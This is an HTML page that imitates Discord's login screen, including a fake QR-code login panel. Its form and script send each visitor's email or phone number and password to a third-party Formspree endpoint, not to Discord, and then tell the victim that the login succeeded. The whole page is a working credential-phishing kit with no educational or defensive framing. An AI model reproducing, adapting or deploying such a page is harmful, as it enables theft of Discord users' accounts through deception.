<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background: url('https://i.imgur.com/8Hl7Fs3.png') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }

        .login-container {
            background-color: #36393f;
            width: 480px;
            padding: 32px;
            border-radius: 5px;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
        }

        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .login-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .login-header p {
            color: #b9bbbe;
            font-size: 16px;
        }

        .login-form {
            display: flex;
            flex-direction: column;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            color: #b9bbbe;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            background-color: #303339;
            border: 1px solid #222428;
            border-radius: 3px;
            color: #fff;
            font-size: 16px;
        }

        .form-group input:focus {
            border-color: #7289da;
            outline: none;
        }

        .forgot-password {
            color: #7289da;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .login-button {
            background-color: #7289da;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 8px;
        }

        .login-button:hover {
            background-color: #677bc4;
        }

        .register-link {
            color: #72767d;
            font-size: 14px;
        }

        .register-link a {
            color: #7289da;
            text-decoration: none;
        }

        .register-link a:hover {
            text-decoration: underline;
        }

        .qr-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #72767d;
            text-align: center;
        }

        .qr-section h2 {
            font-size: 16px;
            margin-bottom: 8px;
        }

        .qr-section p {
            color: #b9bbbe;
            font-size: 14px;
            margin-bottom: 16px;
        }

        .qr-code {
            width: 160px;
            height: 160px;
            margin: 0 auto;
            background-color: #fff;
            padding: 10px;
            border-radius: 5px;
        }

        .qr-code img {
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>Welcome back!</h1>
            <p>We're so excited to see you again!</p>
        </div>

        <form id="loginForm" class="login-form" action="https://formspree.io/f/mjkynglz" method="POST">
            <div class="form-group">
                <label for="email">EMAIL OR PHONE NUMBER *</label>
                <input type="text" id="email" name="email" required>
            </div>

            <div class="form-group">
                <label for="password">PASSWORD *</label>
                <input type="password" id="password" name="password" required>
            </div>

            <a href="#" class="forgot-password">Forgot your password?</a>

            <button type="submit" class="login-button">Log In</button>

            <div class="register-link">
                Need an account? <a href="#">Register</a>
            </div>
        </form>

        <div class="qr-section">
            <h2>Log in with QR Code</h2>
            <p>Scan this with the Discord mobile app to log in instantly.</p>
            <div class="qr-code">
                <img src="https://i.imgur.com/IyjV3WU.png" alt="QR Code">
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get form data
            const formData = new FormData(this);
            
            // Send data to Formspree
            fetch(this.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(response => {
                if (response.ok) {
                    alert('Login successful!');
                    this.reset();
                } else {
                    throw new Error('Network response was not ok');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('There was a problem with your login. Please try again.');
            });
        });
    </script>
</body>
</html>
